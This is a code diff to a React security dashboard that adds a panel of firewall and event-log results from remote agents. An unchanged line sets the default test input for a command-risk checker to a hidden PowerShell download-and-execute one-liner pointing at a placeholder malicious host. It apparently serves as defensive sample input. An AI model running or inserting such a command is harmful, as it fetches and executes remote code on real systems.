@@ -7,6 +7,7 @@
 import { useState, useEffect } from 'react';
 import { Card, Button, Glass, useToast, TableContainer, Table, TableHeader, TableRow, TableHead, TableBody, TableCell } from '../zimam-ui';
 import { api, type SecurityStats, type SecurityEvent } from '../lib/api';
+import { apiV1 } from '../lib/apiV1';
 import {
   ShieldAlert,
   CheckCircle2,
@@ -14,8 +15,24 @@ import {
   Unlock,
   Terminal,
   RefreshCw,
+  Bot,
+  ShieldCheck,
 } from 'lucide-react';
+import { NavLink } from 'react-router-dom';
 import { t } from '../lib/i18n';
+
+type ResultEntry = { job_id: string; completed_at: string | null; result: unknown; error: string | null };
+
+interface FleetSecAgent {
+  id: string;
+  name: string;
+  status: string;
+  hostname?: string | null;
+  linked_asset: { id: string; name: string; hostname: string } | null;
+  collector_count: number;
+  firewall: ResultEntry | null;
+  eventlog: ResultEntry | null;
+}
 
 export function SecurityPage() {
   const toast = useToast();
@@ -30,17 +47,36 @@ export function SecurityPage() {
   const [testCommand, setTestCommand] = useState('powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://malicious.cc/p.ps1\')"');
   const [commandResult, setCommandResult] = useState<any>(null);
   const [checkingCmd, setCheckingCmd] = useState(false);
+  const [fleetSec, setFleetSec] = useState<FleetSecAgent[]>([]);
 
   const fetchSecurity = async () => {
     try {
-      const [st, ev, blk] = await Promise.all([
+      const [st, ev, blk, fleetRes] = await Promise.all([
         api.getSecurityStats(),
         api.getSecurityEvents().catch(() => []),
         api.getBlockedIps().catch(() => []),
+        apiV1.fleetSummary().catch(() => null),
       ]);
       setStats(st);
       setEvents(Array.isArray(ev) ? ev : []);
       setBlockedIps(Array.isArray(blk) ? blk : []);
+      if (fleetRes?.agents?.length) {
+        const detailed = await Promise.all(
+          fleetRes.agents.map(async (ag) => {
+            let firewall: ResultEntry | null = null;
+            let eventlog: ResultEntry | null = null;
+            if (ag.collector_count > 0) {
+              const r = await apiV1.agentLatestResults(ag.id).catch(() => null);
+              firewall = r?.results?.['firewall.state'] ?? null;
+              eventlog = r?.results?.['eventlog.tail'] ?? null;
+            }
+            return { ...ag, firewall, eventlog };
+          }),
+        );
+        setFleetSec(detailed);
+      } else {
+        setFleetSec([]);
+      }
     } catch (err: any) {
       toast(err.message || t('فشل جلب بيانات الأمان'), 'error');
     }
@@ -213,6 +249,73 @@ export function SecurityPage() {
           <span style={{ fontSize: 11, color: 'var(--text-3)' }}>Network Level Auth</span>
         </Glass>
       </div>
+
+      {/* 2b. ZIMAM remote agent security — real firewall/eventlog collector results */}
+      {fleetSec.length > 0 && (
+        <Glass style={{ padding: 22, display: 'flex', flexDirection: 'column', gap: 14 }}>
+          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', flexWrap: 'wrap', gap: 10 }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+              <div style={{ width: 36, height: 36, borderRadius: 10, background: 'var(--accent-soft)', border: '1px solid var(--accent-soft)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: 'var(--accent)' }}>
+                <ShieldCheck size={20} />
+              </div>
+              <div>
+                <h2 style={{ fontSize: 16, fontWeight: 700, color: 'var(--text-1)', margin: 0 }}>
+                  {t('درع زِمام عن بُعد (Remote Agent Shield)')}
+                </h2>
+                <span style={{ fontSize: 11, color: 'var(--text-3)' }}>
+                  {t('حالة جدار الحماية وأحدث أحداث السجل من وكلاء Zimam.Agent — بيانات حقيقية مجمعة')}
+                </span>
+              </div>
+            </div>
+            <NavLink to="/agents" style={{ fontSize: 12, color: 'var(--accent)', fontWeight: 700, textDecoration: 'none' }}>
+              {t('إدارة الوكلاء')} ←
+            </NavLink>
+          </div>
+
+          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(320px, 1fr))', gap: 12 }}>
+            {fleetSec.map((ag) => (
+              <div key={ag.id} style={{ border: '1px solid var(--hairline)', borderRadius: 12, padding: '14px 16px', background: 'var(--glass-tint)' }}>
+                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
+                    <Bot size={15} style={{ color: 'var(--accent)' }} />
+                    <span style={{ fontSize: 13, fontWeight: 800, color: 'var(--text)' }}>{ag.linked_asset?.name || ag.name}</span>
+                  </div>
+                  <span style={{ fontSize: 10, fontWeight: 700, padding: '2px 8px', borderRadius: 999, background: ag.status === 'online' ? 'var(--paid-bg)' : 'var(--surface-glass-tint)', color: ag.status === 'online' ? 'var(--paid)' : 'var(--text-3)' }}>
+                    {ag.status}
+                  </span>
+                </div>
+                <div style={{ fontSize: 11, color: 'var(--text-3)', fontFamily: 'var(--font-telemetry)', direction: 'ltr', textAlign: 'left', marginBottom: 10 }}>
+                  {ag.hostname || ag.id.slice(0, 8)}
+                </div>
+
+                {(['firewall', 'eventlog'] as const).map((kind) => {
+                  const entry = ag[kind];
+                  const label = kind === 'firewall' ? t('حالة جدار الحماية') : t('أحداث سجل النظام');
+                  return (
+                    <details key={kind} style={{ marginBottom: 8, border: '1px solid var(--hairline)', borderRadius: 8, padding: '8px 10px' }}>
+                      <summary style={{ fontSize: 11, fontWeight: 700, color: 'var(--text-2)', cursor: 'pointer', display: 'flex', justifyContent: 'space-between', gap: 8 }}>
+                        <span>{label}</span>
+                        <span style={{ fontSize: 10, color: 'var(--text-3)', fontWeight: 400 }}>
+                          {entry ? (entry.completed_at ? new Date(entry.completed_at).toLocaleString('ar-SA') : '—') : t('لا بيانات')}
+                        </span>
+                      </summary>
+                      {!entry ? (
+                        <div style={{ fontSize: 11, color: 'var(--text-3)', marginTop: 6 }}>{t('لم يُرسل هذا الجامع بعد — أرسله من صفحة الوكلاء.')}</div>
+                      ) : entry.error ? (
+                        <div className="text-status-danger" style={{ fontSize: 11, marginTop: 6 }}>{entry.error}</div>
+                      ) : (
+                        <pre dir="ltr" style={{ margin: '8px 0 0', fontSize: 10, fontFamily: 'var(--font-telemetry)', color: 'var(--text-2)', whiteSpace: 'pre-wrap', wordBreak: 'break-word', maxHeight: 160, overflowY: 'auto' }}>
+                          {JSON.stringify(entry.result, null, 2)}
+                        </pre>
+                      )}
+                    </details>
+                  );
+                })}
+              </div>
+            ))}
+          </div>
+        </Glass>
+      )}
 
       {/* 3. Command Execution Risk Guard (Stitch _5 H2) */}
       <Glass style={{ padding: 22, display: 'flex', flexDirection: 'column', gap: 16 }}>
